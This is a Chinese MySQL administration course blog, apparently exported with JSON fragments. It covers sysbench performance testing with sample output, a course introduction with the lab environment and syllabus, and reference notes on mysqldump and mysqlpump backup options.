主要测试方式 cpu性能 磁盘io性能 调度程序性能 内存分配及传输速度 POSIX线程性能 数据库性能(OLTP基准测试) 找范围内最大素数{时间越短越好} 不同场景下IOPS{越大越好} 线程并发执行，循环响应信号量花费的时间{越少越好} 以不同块大小传输一定数量的数据吞吐量大小{越大越好} 并发线程同时申请互斥锁循环一定次数花费的时间{越少越好} qps、tps越高越好 开始测试编译成功之后，就要开始测试各种性能了，测试的方法官网网站上也提到一些，但涉及到 OLTP 测试的部分却不够准确。在这里我大致提一下： cpu性能测试 进行素数的加法运算:指定最大的素数为 20000，记录测试结果（可以根据机器cpu的性能来适当调整数值） sysbench –test=cpu –cpu-max-prime=20000 run 123456789101112131415161718192021222324252627[root@localhost ~]# sysbench --test=cpu --cpu-max-prime=20000 runsysbench 0.4.12: multi-threaded system evaluation benchmarkRunning the test with following options:Number of threads: 1Doing CPU performance benchmarkThreads started!Done.Maximum prime number checked in CPU test: 20000Test execution summary: total time: 30.7005s total number of events: 10000 total time taken by event execution: 30.6870 per-request statistics: min: 2.47ms avg: 3.07ms max: 106.81ms approx. 95 percentile: 3.74msThreads fairness: events (avg/stddev): 10000.0000/0.00 execution time (avg/stddev): 30.6870/0.00 线程测试 测试64个线程sysbench –test=threads –num-threads=64 –thread-yields=100 –thread-locks=2 run ~]# sysbench --test123456789101112131415161718192021222324sysbench 0.4.12: multi-threaded system evaluation benchmarkRunning the test with following options:Number of threads: 64Doing thread subsystem performance testThread yields per test: 100 Locks used: 2Threads started!Done.Test execution summary: total time: 1.3949s total number of events: 10000 total time taken by event execution: 66.0646 per-request statistics: min: 0.03ms avg: 6.61ms max: 1265.23ms approx. 95 percentile: 9.50msThreads fairness: events (avg/stddev): 156.2500/302.22 execution time (avg/stddev): 1.0323/0.33 磁盘IO性能测试 最大创建16个线程，创建的文件总大小为3G，文件读写模式为随机读 sysbench –test=fileio –num-threads=16 –file-total-size=3G –file-test-mode=rndrw prepare #创建测试文件​sysbench –test=fileio –num-threads=16 –file-total-size=3G –file-test-mode=rndrw run #执行测试文件​sysbench –test=fileio –num-threads=16 –file-total-size=3G –file-test-mode=rndrw cleanup #删除测试文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[root@localhost ~]# sysbench --test=fileio --num-threads=16 --file-total-size=3G --file-test-mode=rndrw preparesysbench 0.4.12: multi-threaded system evaluation benchmark128 files, 24576Kb each, 3072Mb totalCreating files for the test...[root@localhost ~]# sysbench --test=fileio --num-threads=16 --file-total-size=3G --file-test-mode=rndrw runsysbench 0.4.12: multi-threaded system evaluation benchmarkRunning the test with following options:Number of threads: 16Extra file open flags: 0128 files, 24Mb each3Gb total file sizeBlock size 16KbNumber of random requests for random IO: 10000Read/Write ratio for combined random IO test: 1.50Periodic FSYNC enabled, calling fsync() each 100 requests.Calling fsync() at the end of test, Enabled.Using synchronous I/O modeDoing random r/w testThreads started!Done.Operations performed: 6008 Read, 3997 Write, 12800 Other = 22805 TotalRead 93.875Mb Written 62.453Mb Total transferred 156.33Mb (2.9644Mb/sec) 189.72 Requests/sec executedTest execution summary: total time: 52.7348s total number of events: 10005 total time taken by event execution: 434.9929 per-request statistics: min: 0.01ms avg: 43.48ms max: 1105.16ms approx. 95 percentile: 180.46msThreads fairness: events (avg/stddev): 625.3125/46.52 execution time (avg/stddev): 27.1871/1.19 [root@localhost ~]# sysbench --test=fileio --num-threads=16 --file-total-size=3G --file-test-mode=rndrw cleanupsysbench 0.4.12: multi-threaded system evaluation benchmarkRemoving test files... 内存测试 测试过程是在内存中传输 4G 的数据量，每个 block 大小为 8K。 sysbench –test=memory –memory-block-size=8k –memory-total-size=4G run OLTP测试 测试的表存储引擎类型为innodb，表最大记录数为 1000000， 测试 OLTP 时，先创建数据库 sbtest，或者自己用参数 –mysql-db 来指定其他数据库。 –test=oltp 制定测试类型为OLTP –db-driver=mysql 测试的数据库类型为mysql –mysql-table-engine 指定创建的测试表sbtest为 innodb 储引擎类型 –mysql-host=localhost –mysql-user=root –mysql-password=uplooking 分别为服务器ip，用户名和密码 –oltp-table-size=10000 创建的测试表的大小为1万行 –num-threads=128 线程数量为128 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@localhost ~]# sysbench --test=oltp --db-driver=mysql --mysql-host=localhost --mysql-user=root --mysql-password=uplooking --mysql-db=sbtest --mysql-table-engine=innodb --oltp-table-size=10000 --num-threads=128 preparesysbench 0.4.12: multi-threaded system evaluation benchmarkCreating table &apos;sbtest&apos;...Creating 10000 records in table &apos;sbtest&apos;...[root@localhost ~]# sysbench --test=oltp --db-driver=mysql --mysql-host=localhost --mysql-user=root --mysql-password=uplooking --mysql-db=sbtest --mysql-table-engine=innodb --oltp-table-size=10000 --num-threads=128 runsysbench 0.4.12: multi-threaded system evaluation benchmarkRunning the test with following options:Number of threads: 128Doing OLTP test.Running mixed OLTP testUsing Special distribution (12 iterations, 1 pct of values are returned in 75 pct cases)Using &quot;BEGIN&quot; for starting transactionsUsing auto_inc on the id columnMaximum number of requests for OLTP test is limited to 10000Threads started!Done.OLTP test statistics: queries performed: read: 181986 write: 57056 other: 22999 total: 262041 transactions: 10000 (50.00 per sec.) deadlocks: 2999 (14.99 per sec.) read/write requests: 239042 (1195.09 per sec.) other operations: 22999 (114.98 per sec.)Test execution summary: total time: 200.0198s total number of events: 10000 total time taken by event execution: 25451.6909 per-request statistics: min: 9.47ms avg: 2545.17ms max: 26148.89ms approx. 95 percentile: 6902.69msThreads fairness: events (avg/stddev): 78.1250/7.68 execution time (avg/stddev): 198.8413/0.48[root@localhost ~]# sysbench --test=oltp --db-driver=mysql --mysql-host=localhost --mysql-user=root --mysql-password=uplooking --mysql-db=sbtest --mysql-table-engine=innodb --oltp-table-size=10000 --num-threads=128 cleanupsysbench 0.4.12: multi-threaded system evaluation benchmarkDropping table &apos;sbtest&apos;...Done. 50.00 per sec 为每秒事务量，1195.09 per sec 每秒的读写请求数，total time: 200.0198s 总的用时","link":"/2017/01/03/booboo_mysql/06-MySQL-sysbench/"},{"title":"MySQL 管理课程 第一课 课程简介","text":"教学对象：有一定linux基础 数据库版本：maraidb5.5 mariadb10.2 mysql5.7 操作系统：RHEL7.2 最小化安装 MySQL 管理课程，预计课时10天，说是说数据库，其实也属于项目的一部分，我们会发现在项目的当中，多多少少都会用到数据库，而且数据库还是一个重要的组成部分，在整个项目环境当中呢，我们会讲到项目的搭建、迁移、拓展，一台机器变成多台机器，解决用户的性能问题，那么在拓展过程当中呢，我们第一步拓展的都是数据库，因为数据库的压力是最大的，第一个遇到性能瓶颈的都是在数据库上面，所以的话呢，我们在MySQL的课程当中会主要以系统管理员的角度去讲讲数据库的备份、冗余、扩展、高可用、负载均衡。 为什么MySQL ?DB-Engines 最近发布了 2017 年 2 月份的数据库排名。 前十名中，Oracle，MySQL 和 Microsoft SQL Server 仍占据前三名，Oracle 虽然长期霸占首位，但得分却呈下降趋势，与 1 月相比少了 12.89，与去年同期相比，少了 72.31。第二名的 MySQL 得分均有所上涨，与去年同期相比，增长 59.18，第三名的 Microsoft SQL Server 得分较 1 月下降了 17.5，比去年同期，得分有比较高的提升。 具体情况请看前 20 名排名情况： 完整排名请看这里：http://db-engines.com/en/ranking DB-Engines 排名的数据依据 5 个不同的因素： Google 以及 Bing 搜索引擎的关键字搜索数量 Google Trends 的搜索数量 Indeed 网站中的职位搜索量 LinkedIn 中提到关键字的个人资料数 Stackoverflow 上相关的问题和关注者数量 下图是每个数据库的变化趋势： 可以看到，前 3 名一直保持着远高于其它数据库的地位，前三基本没有悬念。只是，第二名和第三名的MySQL 和 Microsoft SQL Server 已经越来越接近第一名的Oracle，说不定在下一次排名发布时，我们能看到不一样的三甲排名。 详细趋势请看这里：http://db-engines.com/en/ranking_trend 有人用python写了爬虫抓取国内网站数据制作了中国数据库排行榜。计算方法和db-engines类似，然而根据国内做了一些调整，统计结果是2017年1月MYSQL排名第一，得分为2864.75，而oracle得分为2752.67，sql server得分仅仅为981.5 我们还可以看看国内对mysql数据库工程师的招聘信息 从上图看到2月6日这一天51job上对mysql dba的职位提供有316个，我们再看看对岗位的要求，如下图： 为什么是 MySQL ?对每一种技术,我们都考虑了其最大关注点,并提出同样的问题。下面是我们对 MySQL 的考虑 : Q：它解决了我们的存储需求吗? A：没错,我们需要映射、索引、排序和 blob 存储,这些MySQL 都有。 Q：它常用吗? 你可以招聘到相关员工吗? A：MySQL 是目前生产线上最常使用的数据库之一。很容易招到使用过 MySQL 的人。 Q：它的社区活跃吗? A：非常活跃。有好多非常棒的书籍,和一个强大的在线社区。 Q：面对故障,它健壮吗? A：即使在最恶劣的情况下,我们也从来没有丢失过数据。 Q：它的扩展性如何? A：就它本身来说,只是一个很小的组件。我们需要一种上层的分片方案(这完全是另一个问题)。 Q：你会是最大的用户吗? A：不, 目 前 不 是。 最 大 的 用 户 包 括 Facebook、Twitter 和 Google。除非你能够改进一种技术,否则你不会想要成为它最大的用户。如果你是最大的用户,你会碰到一些新的扩展性问题,而其他人根本没机会遇到。 Q：它的成熟度如何? A：真正的区别在于成熟度。根据复杂度的不同,成熟度就好比衡量完成一个程序所需的血、汗和泪。MySQL 的确复杂,但可比不上那些神奇的自动集群 NoSQL 方案。而且,MySQL 拥有 30 年(1996年第一版)最好和最聪明的贡献,来自于诸如Facebook 和 Google 那样大规模使用它的公司。根据我们的成熟度定义,在我们审查的所有技术中,MySQL 是一个明智的选择。 Q：有好的调试工具吗? A：作为一个成熟的产品,你当然需要强大的调试和分析工具,因为人们很容易遇到一些类似的棘手情况。比如你可能在凌晨三点遇到问题(不止一次)。相比用另一种技术重写一遍熬到凌晨六点,发现问题的根源然后回去睡觉舒服多了。 Mysql 管理课程环境使用说明DB100课程基于RHEL7.2系统，课程教授学生完成基于此系统的Mysql 5.7 、MariaDB 10.2数据库管理课程和基础课程内容。 授课网络环境配置如下 workstation虚拟机均安装rhel7.2系统，（安装图形化界面并配置runlevel 5启动，root密码为uplooking ，配置了基础的YUM源指向classroom）， workstation虚拟机均配置了2块虚拟机网卡，eth0接入物理机br0网桥，动态获得ip地址172.25.0.10；eth1接入物理机private网桥，不获得ip地址；workstation虚拟机均配置2块虚拟硬盘（vda、vdb），以方便授课演示。workstation虚拟机均配置2GB运行内存。 mastera、masterb、slavea 、slaveb 和dbproxy虚拟机均安装rhel7.2系统，（没有安装图形化界面，root密码为uplooking ，配置了基础的YUM源指向classroom）， mastera、masterb、slavea 、slaveb 和dbproxy虚拟机均配置了2块虚拟机网卡，eth0接入物理机br0网桥，动态获得ip地址172.25.0.11~172.25.0.5；eth1接入物理机private网桥，不获得ip地址；mastera、masterb、slavea 、slaveb 和dbproxy虚拟机均配置2块虚拟硬盘（vda、vdb），以方便授课演示。mastera、masterb、slavea 、slaveb 和dbproxy虚拟机均配置512MB运行内存。 已在classroom上完成DNS配置，正向和方向域名及邮件代理域名和虚拟机域名设置如下： classroom.example.com 172.25.254.254 fN.example.com 172.25.254.N workstationN.example.com 172.25.N.10 masteraN.example.com 172.25.N.11 masterbN.example.com 172.25.N.12 slaveaN.example.com 172.25.N.13 slavebN.example.com 172.25.N.14 dbproxyN.example.com 172.25.N.15 N:1~80 http://classroom.example.com/materials 为第三方软件包和资料目录，也可以通过http://materials.example.com 直接访问。 注意事项** Mariadb 10.2 和Mysql 5.7 在yum安装中会有冲突，不要同时配置MariaDB和MySQL的源。 ** 网络拓扑图 课程大纲123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146MYSQL一、MySQL管理课程简介1.MySQL 管理课程2.为什么MySQL ?3.Mysql 管理课程环境使用说明4.授课网络环境配置如下5.注意事项6.网络拓扑图二、MySQL和MariaDB数据库介绍1.数据库的基础概念2.数据库的分类3.什么是MySQL4.如何获得MySQL相关资源5.MySQL在企业中的应用场景6.MySQL 数据库安装 RHEL 7.2 RPM 包安装 MariaDB 5.5 RHEL 7.2 RPM 包安装 MariaDB 10.2 RHEL 7.2 RPM 包安装 MySQL 5.7 RHEL 7.2 二进制文件安装 MySQL 5.67.MySQL客户端连接数据库 MySQL客户端的使用 python连接MySQL数据库 PHPmyAdmin在线工具使用 MySQL Workbench 连接数据库三、结构化查询语言SQL介绍和基本操作1.sql语法，数据类型，运算符2.DDL(Data Definition Languages)语句3.DML(Data Manipulation Language)语句4.DCL(Data Control Language)语句5.DQL(Data Query Language)语句6.实战项目1:熟悉SQL语句7.实战项目2:熟悉mysql.user表8.实战项目3:完成数据库用户权限操作项目四、MySQL逻辑架构和Innodb存储引擎1.MySQL 逻辑架构2.MySQL 存储引擎 存储引擎概述 知名的两大存储引擎 事务 并发控制 锁机制 多版本并发控制 MVCC 事务的隔离级别3.INNODB锁 设置INNODB事务隔离级别 实践1：查看innodb默认的事务隔离级别 实践2：改变单个会话的隔离级别 实践3：改变单个实例的隔离级别 实践4：改变所有实例的隔离级别 区分INNODB事务隔离级别 InnoDB 中的隔离级详细描述 实践1：SERIALIZABLE隔离级别查询自动加共享锁 实践2：RU、RC、RR隔离级别的对比 实现一致性锁定读 实践1：设置innodb申请锁等待超时时间 实践2：设置一致性锁定读，加共享锁测试 实践3：设置一致性锁定读，加排他锁测试 认识锁的算法 知识点 实践1： 验证nextkey lock降级为record key 实践2： 关闭GAP锁_RC 实践3： 关闭GAP锁_innodb_locks_unsafe_for_binlog 实践4： nextkeylocking是如何解决幻读问题的五、MySQL备份与恢复1.为什么要备份2.什么是备份3.备份的两大要素4.备份的分类 物理备份和逻辑备份 逻辑备份 物理备份 增量备份和差异备份 在线（热）备份、温备份、离线（冷）备份5.备份和恢复工具 tar tar备份步骤 tar还原步骤 课堂实战1: 利用tar实现物理备份并还原 LVM SnapShot lvm快照的优点和缺点 os支持lvm方式 lvm快照备份数据 lvm快照还原数据 课堂实战2: 利用LVM快照实现物理备份并还原 mysqldump MyISAM和INNODB表的备份 mysqldump命令的用法 mysqldump备份步骤 mysqldump还原步骤 课堂实战3: 利用mysqldump实现逻辑备份并还原 Percona Xtrabackup 课堂实战4：innobackupex实时增量备份和还原6.MySQL 日志的分类 二进制日志的管理和备份 如何打开二进制日志 如何查看二进制日志 基于二进制日志的实时增量还原 数据库备份恢复模拟一 数据库备份恢复模拟二 数据库备份恢复模拟三 课堂实战5：基于二进制日志时间点和位置的数据库备份恢复模拟六、MySQL复制replication 1.复制概述2.复制解决的问题3.复制的原理 项目实战1：mariadb server 5.5 单主从架构 项目实战2：mysql server 5.7 基于GTID的单主从架构4.复制中的延迟问题_重演延迟 项目实战3：mysql server 5.7 基于GTID的并行MTS单主从架构 项目实战4：mysql server 5.7 基于GTID的并行MTS单主从架构crash safe参数调优5.复制中的延迟问题_读写分离 半同步复制的潜在问题 无数据丢失的半同步复制 项目实战5：mysql server 5.7 基于GTID的并行MTS单主从半同步架构6.复制中的单点故障问题 复制拓扑_配置MSS 复制拓扑_配置MM 复制拓扑_配置M(s)M(s) 复制拓扑_配置MMSS 项目实战6：mysql server 5.7 基于GTID的并行MTS多级主从 Multisource 半同步架构七、MySQL高可用HA1.什么是高可用2.导致宕机的原因3.如何实现高可用4.避免单点故障 基于复制的冗余 MySQL 同步复制 MySQL Cluster 集群 Galera Cluster 集群5.故障转移和故障恢复 问题的提出 解决方案 什么是数据库代理服务器 目前市面上的数据库代理服务器 mysqlproxy (了解，不讲) mycat6.实战项目： 数据库中间件 Mycat 实现 读写分离负载均衡，后端数据库服务器为 MySQL 5.7 MMSS Multisource Replication 高可用架构7.实战项目: 数据库中间件 Mycat 实现 读写分离负载均衡，后端数据库服务器为 Mariadb 10.2 Galera Cluster同步复制高可用架构","link":"/2016/12/25/booboo_mysql/00-MySQL-Management-Course-Introduction/"},{"title":"MySQL 管理课程 第十一课  MySQL逻辑备份工具mysqldump,mysqlpump,mydumper","text":"mysqldumpmysql经典逻辑备份工具 参数说明，具体的参数可以用mysqldump –help查看。 比较重要的几个参数 ①：–single-transaction 通过将导出操作封装在一个事务(Repeatable Read)内来使得导出的数据是一个一致性快照。只有当表使用支持MVCC的存储引擎（目前只有InnoDB）时才可以工作；其他引擎不能保证导出是一致的。当导出开启了–single-transaction选项时，要确保导出文件有效（正确的表数据和二进制日志位置），就要保证没有其他连接会执行如下语句：ALTER TABLE, DROP TABLE, RENAME TABLE, TRUNCATE TABLE，这会导致一致性快照失效。这个选项开启后会自动关闭lock-tables。并且在mysql5.7.11之前，–default-parallelism大于1的时候和此参也互斥，必须使用–default-parallelism=0。5.7.11之后解决了–single-transaction和–default-parallelism的互斥问题。 ②：–master-data 这个选项可以把binlog的位置和文件名添加到输出中，如果等于1，将会打印成一个CHANGE MASTER命令；如果等于2，会加上注释前缀。并且这个选项会自动打开–lock-all-tables，除非同时设置了–single-transaction（这种情况下，全局读锁只会在开始dump的时候加上一小段时间，不要忘了阅读–single-transaction的部分）。在任何情况下，所有日志中的操作都会发生在导出的准确时刻。这个选项会自动关闭–lock-tables。打开该参数需要有reload权限，并且服务器开启binlog。 ③：–lock-all-tables ，-x 锁定所有库中所有的表。这是通过在整个dump的过程中持有全局读锁来实现的。会自动关闭–single-transaction 和 –lock-tables。 ④：–lock-tables，-l 备份某个库就锁该库的所有表，用READ LOCAL来锁表。MyISAM允许并发写入，因为锁表只针对指定的数据库，不能保证物理上的一致性，不同库的表备份完成时会有不同的状态。用–skip-lock-tables来关闭。 ⑤：–flush-logs，-F 在开始导出前刷新服务器的日志文件。注意，如果你一次性导出很多数据库（使用–databases= 或–all-databases 选项），导出每个库时都会触发日志刷新。例外是当使用了–lock-all-tables、–master-data或–single-transaction时：日志只会被刷新一次，那个时候所有表都会被锁住。所以如果你希望你的导出和日志刷新发生在同一个确定的时刻，你需要使用–lock-all-tables、–master-data和–single-transaction配合 –flush-logs。 ⑥：–opt 该参数默认开启，表示快递启动–add-drop-table –add-locks –create-options –disable-keys –extended-insert –lock-tables –quick –set-charset选项，通过 –skip-opt 关闭。 –all-databases , -A导出全部数据库。 –all-tablespaces , -Y导出全部表空间。 –no-tablespaces , -y不导出任何表空间信息。 –add-drop-database每个数据库创建之前添加drop数据库语句。 –add-drop-table每个数据表创建之前添加drop数据表语句。(默认为打开状态，使用–skip-add-drop-table取消选项) –add-locks在每个表导出之前增加LOCK TABLES并且之后UNLOCK TABLE。(默认为打开状态，使用–skip-add-locks取消选项) –allow-keywords允许创建是关键词的列名字。这由表名前缀于每个列名做到。 –apply-slave-statements在’CHANGE MASTER’前添加’STOP SLAVE’，并且在导出的最后添加’START SLAVE’。 –character-sets-dir字符集文件的目录 –comments附加注释信息。默认为打开，可以用–skip-comments取消 –compatible导出的数据将和其它数据库或旧版本的MySQL 相兼容。值可以为ansi、mysql323、mysql40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options、no_field_options等，要使用几个值，用逗号将它们隔开。它并不保证能完全兼容，而是尽量兼容。 –compact导出更少的输出信息(用于调试)。去掉注释和头尾等结构。可以使用选项：–skip-add-drop-table –skip-add-locks –skip-comments –skip-disable-keys –complete-insert, -c使用完整的insert语句(包含列名称)。这么做能提高插入效率，但是可能会受到max_allowed_packet参数的影响而导致插入失败。 –compress, -C在客户端和服务器之间启用压缩传递所有信息 –create-options, -a在CREATE TABLE语句中包括所有MySQL特性选项。(默认为打开状态) –databases, -B导出几个数据库。参数后面所有名字参量都被看作数据库名。 –debug输出debug信息，用于调试。默认值为：d:t:o,/tmp/mysqldump.trace –debug-check检查内存和打开文件使用说明并退出。 –debug-info输出调试信息并退出 –default-character-set设置默认字符集，默认值为utf8 –delayed-insert采用延时插入方式（INSERT DELAYED）导出数据 –delete-master-logsmaster备份后删除日志. 这个参数将自动激活–master-data。 –disable-keys对于每个表，用/!40000 ALTER TABLE tbl_name DISABLE KEYS */;和/!40000 ALTER TABLE tbl_name ENABLE KEYS */;语句引用INSERT语句。这样可以更快地导入dump出来的文件，因为它是在插入所有行后创建索引的。该选项只适合MyISAM表，默认为打开状态。 –dump-slave该选项将导致主的binlog位置和文件名追加到导出数据的文件中。设置为1时，将会以CHANGE MASTER命令输出到数据文件；设置为2时，在命令前增加说明信息。该选项将会打开–lock-all-tables，除非–single-transaction被指定。该选项会自动关闭–lock-tables选项。默认值为0。 –events, -E导出事件。 –extended-insert, -e使用具有多个VALUES列的INSERT语法。这样使导出文件更小，并加速导入时的速度。默认为打开状态，使用–skip-extended-insert取消选项。 –fields-terminated-by导出文件中忽略给定字段。与–tab选项一起使用，不能用于–databases和–all-databases选项 –fields-enclosed-by输出文件中的各个字段用给定字符包裹。与–tab选项一起使用，不能用于–databases和–all-databases选项 –fields-optionally-enclosed-by输出文件中的各个字段用给定字符选择性包裹。与–tab选项一起使用，不能用于–databases和–all-databases选项 –fields-escaped-by输出文件中的各个字段忽略给定字符。与–tab选项一起使用，不能用于–databases和–all-databases选项 –flush-logs开始导出之前刷新日志。请注意：假如一次导出多个数据库(使用选项–databases或者–all-databases)，将会逐个数据库刷新日志。除使用–lock-all-tables或者–master-data外。在这种情况下，日志将会被刷新一次，相应的所以表同时被锁定。因此，如果打算同时导出和刷新日志应该使用–lock-all-tables 或者–master-data 和–flush-logs。 –flush-privileges在导出mysql数据库之后，发出一条FLUSH PRIVILEGES 语句。为了正确恢复，该选项应该用于导出mysql数据库和依赖mysql数据库数据的任何时候。 –force在导出过程中忽略出现的SQL错误。 –help显示帮助信息并退出。 –hex-blob使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用该选项。影响到的字段类型有BINARY、VARBINARY、BLOB。 –host, -h需要导出的主机信息 –ignore-table不导出指定表。指定忽略多个表时，需要重复多次，每次一个表。每个表必须同时指定数据库和表名。例如：–ignore-table=database.table1 –ignore-table=database.table2 …… –include-master-host-port在–dump-slave产生的’CHANGE MASTER TO..’语句中增加’MASTER_HOST=，MASTER_PORT=‘ –insert-ignore在插入行时使用INSERT IGNORE语句. –lines-terminated-by输出文件的每行用给定字符串划分。与–tab选项一起使用，不能用于–databases和–all-databases选项。 –lock-all-tables, -x提交请求锁定所有数据库中的所有表，以保证数据的一致性。这是一个全局读锁，并且自动关闭–single-transaction 和–lock-tables 选项。 –lock-tables, -l开始导出前，锁定所有表。用READ LOCAL锁定表以允许MyISAM表并行插入。对于支持事务的表例如InnoDB和BDB，–single-transaction是一个更好的选择，因为它根本不需要锁定表。请注意当导出多个数据库时，–lock-tables分别为每个数据库锁定表。因此，该选项不能保证导出文件中的表在数据库之间的逻辑一致性。不同数据库表的导出状态可以完全不同。 –log-error附加警告和错误信息到给定文件 –master-data该选项将binlog的位置和文件名追加到输出文件中。如果为1，将会输出CHANGE MASTER 命令；如果为2，输出的CHANGE MASTER命令前添加注释信息。该选项将打开–lock-all-tables 选项，除非–single-transaction也被指定（在这种情况下，全局读锁在开始导出时获得很短的时间；其他内容参考下面的–single-transaction选项）。该选项自动关闭–lock-tables选项。 –max_allowed_packet服务器发送和接受的最大包长度。 –net_buffer_lengthTCP/IP和socket连接的缓存大小。 –no-autocommit使用autocommit/commit 语句包裹表。 –no-create-db, -n只导出数据，而不添加CREATE DATABASE 语句。 –no-create-info, -t只导出数据，而不添加CREATE TABLE 语句。 –no-data, -d不导出任何数据，只导出数据库表结构。 –no-set-names, -N等同于–skip-set-charset –opt等同于–add-drop-table, –add-locks, –create-options, –quick, –extended-insert, –lock-tables, –set-charset, –disable-keys 该选项默认开启, 可以用–skip-opt禁用. –order-by-primary如果存在主键，或者第一个唯一键，对每个表的记录进行排序。在导出MyISAM表到InnoDB表时有效，但会使得导出工作花费很长时间。 –password, -p连接数据库密码 –pipe(windows系统可用)使用命名管道连接mysql –port, -P连接数据库端口号 –protocol使用的连接协议，包括：tcp, socket, pipe, memory. –quick, -q不缓冲查询，直接导出到标准输出。默认为打开状态，使用–skip-quick取消该选项。 –quote-names,-Q使用（`）引起表和列名。默认为打开状态，使用–skip-quote-names取消该选项。 –replace使用REPLACE INTO 取代INSERT INTO. –result-file, -r直接输出到指定文件中。该选项应该用在使用回车换行对（\\r\\n）换行的系统上（例如：DOS，Windows）。该选项确保只有一行被使用。 –routines, -R导出存储过程以及自定义函数。 –set-charset添加’SET NAMES default_character_set’到输出文件。默认为打开状态，使用–skip-set-charset关闭选项。 –single-transaction该选项在导出数据之前提交一个BEGIN SQL语句，BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。它只适用于多版本存储引擎，仅InnoDB。本选项和–lock-tables 选项是互斥的，因为LOCK TABLES 会使任何挂起的事务隐含提交。要想导出大表的话，应结合使用–quick 选项。 –dump-date将导出时间添加到输出文件中。默认为打开状态，使用–skip-dump-date关闭选项。 –skip-opt禁用–opt选项. –socket,-S`指定连接mysql的socket文件位置，默认路径/tmp/mysql.sock –tab,-T为每个表在给定路径创建tab分割的文本文件。注意：仅仅用于mysqldump和mysqld服务器运行在相同机器上。 –tables覆盖–databases (-B)参数，指定需要导出的表名。 –triggers 导出触发器。该选项默认启用，用–skip-triggers禁用它。`–tz-utc在导出顶部设置时区TIME_ZONE=’+00:00’ ，以保证在不同时区导出的TIMESTAMP 数据或者数据被移动其他时区时的正确性。 –user, -u指定连接的用户名。 –verbose, –v输出多种平台信息。 –version, -V输出mysqldump版本信息并退出 –where, -w只转储给定的WHERE条件选择的记录。请注意如果条件包含命令解释符专用空格或字符，一定要将条件引用起来。 –xml, -X导出XML格式. –plugin_dir客户端插件的目录，用于兼容不同的插件版本。 –default_auth客户端插件默认使用权限。 备份数据库常用案例： 备份内容 情况1 参数 情况2 参数 情况3 库的数量 所有 -A 多个 -B db1 db2 db3 db1 表的数量 所有 多个 –table t1 t2 一个 t1 结构 导出 不导出 -t 数据 导出 不导出 -d 列名 导出 -c 不导出 存储过程 导出 -R 不导出 创建数据库 导出 不导出 -n 导出结构不导出数据 mysqldump -d 数据库名 -uroot -p &gt; xxx.sql 导出数据不导出结构 mysqldump -t 数据库名 -uroot -p &gt; xxx.sql 导出数据和表结构 mysqldump 数据库名 -uroot -p &gt; xxx.sql 导出特定表的结构 mysqldump -uroot -p -B数据库名 --table 表名 &gt; xxx.sql 导出db1库中t1表的表结构和数据，并且打印出列名 mysqldump -uusername -ppassword db1 t1 -c &gt; xxx.sql -c, –complete-insert 使用完整的insert语句(用列名字)。 只导出存储过程 mysqldump -B db1 db2 -t -d -n -R &gt; xxx.sql mysqlpumpMySQL5.7之后多了一个备份工具：mysqlpump。它是mysqldump的一个衍生，mysqldump就不多说明了，现在看看mysqlpump到底有了哪些提升，可以查看官方文档，这里针对如何使用做下说明。 mysqlpump和mysqldump一样，属于逻辑备份，备份以SQL形式的文本保存。逻辑备份相对物理备份的好处是不关心undo log的大小，直接备份数据即可。它最主要的特点是： 并行备份数据库和数据库中的对象的，加快备份过程。 更好的控制数据库和数据库对象（表，存储过程，用户帐户）的备份。 备份用户账号作为帐户管理语句（CREATE USER，GRANT），而不是直接插入到MySQL的系统数据库。 备份出来直接生成压缩后的备份文件。 备份进度指示（估计值）。 重新加载（还原）备份文件，先建表后插入数据最后建立索引，减少了索引维护开销， 加快了还原速度。 备份可以排除或则指定数据库。 参数绝大部分参数和mysqldump一致 1：–add-drop-database：在建立库之前先执行删库操作。 DROP DATABASE IF EXISTS ...; 2：–add-drop-table：在建表之前先执行删表操作。 DROP TABLE IF EXISTS .......; 3：–add-drop-user：在CREATE USER语句之前增加DROP USER，注意：这个参数需要和–users一起使用，否者不生效。 DROP USER ‘backup’@’192.168.123.%’; 4：–add-locks：备份表时，使用LOCK TABLES和UNLOCK TABLES。注意：这个参数不支持并行备份，需要关闭并行备份功能：–default-parallelism=0 123LOCK TABLES `...`.`...` WRITE;...UNLOCK TABLES; 5：–all-databases：备份所有库，-A。 6：–bind-address：指定通过哪个网络接口来连接Mysql服务器（一台服务器可能有多个IP），防止同一个网卡出去影响业务。 7：–complete-insert：dump出包含所有列的完整insert语句。 8：–compress： 压缩客户端和服务器传输的所有的数据，-C。 9：–compress-output：默认不压缩输出，目前可以使用的压缩算法有LZ4和ZLIB。 12345shell&gt; mysqlpump --compress-output=LZ4 &gt; dump.lz4shell&gt; lz4_decompress dump.lz4 dump.txtshell&gt; mysqlpump --compress-output=ZLIB &gt; dump.zlibshell&gt; zlib_decompress dump.zlib dump.txt 10：–databases：手动指定要备份的库，支持多个数据库，用空格分隔，-B。 11：–default-character-set：指定备份的字符集。 12：–default-parallelism：指定并行线程数，默认是2，如果设置成0，表示不使用并行备份。注意：每个线程的备份步骤是：先create table但不建立二级索引（主键会在create table时候建立），再写入数据，最后建立二级索引。 13：–defer-table-indexes：延迟创建索引，直到所有数据都加载完之后，再创建索引，默认开启。若关闭则会和mysqldump一样：先创建一个表和所有索引，再导入数据，因为在加载还原数据的时候要维护二级索引的开销，导致效率比较低。关闭使用参数：–skip–defer-table-indexes。 14：–events：备份数据库的事件，默认开启，关闭使用–skip-events参数。 15：–exclude-databases：备份排除该参数指定的数据库，多个用逗号分隔。类似的还有–exclude-events、–exclude-routines、–exclude-tables、–exclude-triggers、–exclude-users。 12345mysqlpump --exclude-databases=mysql,sys #备份过滤mysql和sys数据库mysqlpump --exclude-tables=rr,tt #备份过滤所有数据库中rr、tt表mysqlpump -B test --exclude-tables=tmp_ifulltext,tt #备份过滤test库中的rr、tt表 注意：要是只备份数据库的账号，需要添加参数–users，并且需要过滤掉所有的数据库，如： mysqlpump –users –exclude-databases=sys,mysql,db1,db2 –exclude-users=dba,backup #备份除dba和backup的所有账号。 16：–include-databases：指定备份数据库，多个用逗号分隔，类似的还有–include-events、–include-routines、–include-tables、–include-triggers、–include-users，大致方法使用同15。 17：–insert-ignore：备份用insert ignore语句代替insert语句。 